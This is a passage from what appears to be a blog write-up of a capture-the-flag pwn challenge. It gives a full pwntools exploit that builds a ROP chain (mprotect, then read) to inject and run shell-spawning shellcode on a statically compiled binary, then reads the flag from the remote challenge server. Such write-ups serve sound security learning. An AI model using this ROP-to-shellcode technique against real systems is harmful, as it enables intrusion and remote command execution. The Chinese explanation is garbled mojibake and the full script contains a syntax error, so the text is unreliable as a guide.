<p>æˆ‘ä»¬è®¡åˆ’å‘0x400000æ®µå†™å…¥shellcodeï¼Œå› æ­¤é€‰æ‹©äº†ä¿®æ”¹è¯¥åœ°å€çš„æƒé™</p>
<p>æ¥ä¸‹æ¥æ‹¿readå‡½æ•°å‘è¯¥æ®µå†™å…¥shellcodeï¼š</p>
<p><img src="https://pic4.zhimg.com/80/v2-d3c6d82309f9c2cff4f78098cde77063_1440w.webp" alt="read"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(rdxAddr)</span><br><span class="line">payload += p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(rsiAddr)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(readPlt)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br></pre></td></tr></table></figure>

<p>ç”±äºèƒ½å¤Ÿè¯»å…¥å¾ˆé•¿çš„å­—æ®µï¼Œæˆ‘ä»¬ç›´æ¥æ¥ç€æ„é€ payloadçš„ç¬¬äºŒéƒ¨åˆ†ï¼Œæœ€åè¿”å›åœ°å€å†™æˆ0x400000ï¼›</p>
<p>æ¥ä¸‹æ¥è¾“å…¥shellcodeï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br></pre></td></tr></table></figure>

<p>è¿œç¨‹è¯•ä¸€ä¸‹ï¼ˆæœ‰æ—¶ä¼šæ”¶åˆ°EOFerrorï¼Œå†è¯•ä¸€æ¬¡å°±è¡Œï¼‰ï¼ŒæˆåŠŸæ‹¿åˆ°flagï¼š</p>
<p><img src="https://pic2.zhimg.com/80/v2-f83c54a3bb14cad295ec797f4c66940d_1440w.webp" alt="final"></p>
<p>è¿˜æœ‰ä¸€ç§åšæ³•æ˜¯é€šè¿‡ROPgadgetå†…ç½®çš„ropchainæ¥è‡ªåŠ¨ç”Ÿæˆgetshellè„šæœ¬(ä¸€èˆ¬æœ€ç»ˆæ˜¯é€šè¿‡syscallæ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;shâ€, 0, 0))ï¼Œç”¨æ³•å°±æ˜¯â€“ropchainï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚</p>
<p>é™æ€ç¼–è¯‘çš„å¼±ç‚¹å°±æ˜¯ä¼šä¸€è‚¡è„‘åœ°ç¼–è¯‘å¤§é‡å‡½æ•°ï¼Œå„ç§gadgetséå¸¸å¥½å¯»æ‰¾ï¼Œæ„é€ rophchainçš„æ–¹æ³•éå¸¸çµæ´»ï¼Œè¿™åªæ˜¯ä¸€ä¸ªä¾‹å­ã€‚</p>
<p>å®Œæ•´expï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">binary = <span class="string">&#x27;../flower&#x27;</span></span><br><span class="line">elf =ELF(binary)</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">port = <span class="number">28248</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span> = <span class="string">b&quot;ls &amp;&amp; cat flag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#===============plt &amp; got===============#</span></span><br><span class="line">readPlt = <span class="number">0x43f9d0</span></span><br><span class="line">mprotectPlt = <span class="number">0x440520</span></span><br><span class="line">rdiAddr = <span class="number">0x0000000000401696</span></span><br><span class="line"><span class="comment">#pop rdi;ret</span></span><br><span class="line">rsiAddr = <span class="number">0x00000000004017b7</span></span><br><span class="line">rdxAddr = <span class="number">0x0000000000442e46</span></span><br><span class="line"><span class="comment">#===============shellcode===============#</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#=================start=================#</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;-22&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">88</span></span><br><span class="line">payload += p64(rdiAddr</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">payload += p64(rsiAddr)</span><br><span class="line">payload += p64(<span class="number">0x1024</span>)</span><br><span class="line">payload += p64(rdxAddr)</span><br><span class="line">payload += p64(<span class="number">0x7</span>)</span><br><span class="line">payload += p64(mprotectPlt)</span><br><span class="line"></span><br><span class="line">payload += p64(rdxAddr)</span><br><span class="line">payload += p64(<span class="number">0x60</span>)</span><br><span class="line">payload += p64(rsiAddr)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line">payload += p64(rdiAddr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(readPlt)</span><br><span class="line">payload += p64(<span class="number">0x400000</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"><span class="comment">#=================End=================#</span></span><br><span class="line">p.sendline(<span class="built_in">next</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">NazrinDuck</p>
  <div class="site-description" itemprop="description">FÃ¢tih'in Ä°stanbul'u fethettiÄŸi yaÅŸtasÄ±n!</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">12</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">NazrinDuck</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
